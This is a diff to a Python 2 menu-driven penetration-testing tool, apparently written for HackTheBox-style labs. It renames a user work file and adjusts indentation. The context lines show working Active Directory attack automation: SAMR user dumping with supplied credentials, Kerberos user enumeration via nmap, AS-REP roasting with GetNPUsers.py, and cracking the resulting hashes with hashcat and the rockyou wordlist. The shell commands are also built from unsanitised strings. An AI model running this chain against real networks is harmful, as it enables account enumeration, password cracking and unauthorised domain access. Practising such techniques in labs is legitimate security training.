@@ -309,11 +309,11 @@ if not os.path.exists("SHARES.tmp"):		# HOLDS INITIAL SHARE DATA
 else:
    print "[-] File SHARES.tmp already exists..."
 
-if not os.path.exists("user.tmp"):		# HOLDS CURRENT FILTERED USER LIST
-   os.system("touch user.tmp")
-   print "[-] File user.tmp created..."
+if not os.path.exists("users.txt"):		# HOLDS CURRENT FILTERED USER LIST
+   os.system("touch users.txt")
+   print "[-] File users.txt created..."
 else:
-   print "[-] File user.tmp already exists..."
+   print "[-] File users.txt already exists..."
 
 print "[-] Populating system variables..."
 
@@ -981,7 +981,7 @@ while True:
    if selection =='33':
       print "\nPlease wait..."
       os.remove("USERS.tmp")	# CLEAR WORK FILE
-      os.remove("user.tmp")	# CLEAR WORK FILE
+      os.remove("users.txt")	# CLEAR WORK FILE
 
       os.system(PRO + "samrdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
       os.system("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
@@ -998,11 +998,11 @@ while True:
             US[x] = padding(US[x], COL3)
             if US[x] != "":
                print "[-] Found user " + US[x]
-               os.system("echo " + US[x] + " >> user.tmp")	# ASSIGN USER NAME
+               os.system("echo " + US[x] + " >> users.txt")	# ASSIGN USER NAME
             else:
                US[x] = "                                "	# ASSIGN EMPTY USER
-         if PA[x] == "                                ":
-            PA[x]  = "................................";
+            if PA[x] == "                                ":
+               PA[x]  = "................................";
       
       if US[12] != "                                ":
          US[11] = "Some users are not shown!!..."
@@ -1135,15 +1135,15 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - Kerberus Filter user.tmp
+# Details : Menu option selected - Kerberus Filter users.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='45':
       print "\nPlease wait..."
       os.remove("USERS.tmp")	# CLEAR WORK FILE
-      os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=user.tmp " + TIP.rstrip(" ") + " >> KUSERS.tmp")
-      os.remove("user.tmp")	# CLEAR WORK FILE
+      os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+      os.remove("users.txt")	# CLEAR WORK FILE
       os.system("sed -i '/@/!d' KUSERS.tmp")
       os.system("sort KUSERS.tmp > USERS2.tmp")
       os.remove("KUSERS.tmp")
@@ -1158,12 +1158,12 @@ while True:
             US[x] = padding(US[x], COL3)
             if US[x] != "                                ":
                print "[-] Found user " + US[x]
-               os.system("echo " + US[x] + " >> user.tmp")	# ASSIGN NEW USER
+               os.system("echo " + US[x] + " >> users.txt")	# ASSIGN NEW USER
             else:
                US[x] = "                                "	# ASSIGN EMPTY USER
 
-         if PA[x] == "                                ":
-            PA[x]  = "................................";     
+            if PA[x] == "                                ":
+               PA[x]  = "................................";     
       
       if US[12] != "":
          US[11] = "Some users are not shown!!..."
@@ -1176,17 +1176,17 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - GetNPUsers.py HTB.local/ -usersfile user.tmp -format hashcat -outputfile hashes.roast 
-# Modified: N/A                    megabank/-no-pass -usersfile user.tmp
+# Details : Menu option selected - GetNPUsers.py HTB.local/ -usersfile users.txt -format hashcat -outputfile hashes.roast 
+# Modified: N/A                    megabank/-no-pass -usersfile users.txt
 # -------------------------------------------------------------------------------------
 
    if selection =='46':
-      if linecache.getline('user.tmp', 1) != "":
-         command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile user.tmp")
+      if linecache.getline('users.txt', 1) != "":
+         command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
          command("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
          command("strings cracked.txt")
       else:
-         command("echo 'The file user.tmp is empty? try running option 33 first...'")
+         command("echo 'The file users.txt is empty? try running option 33 first...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
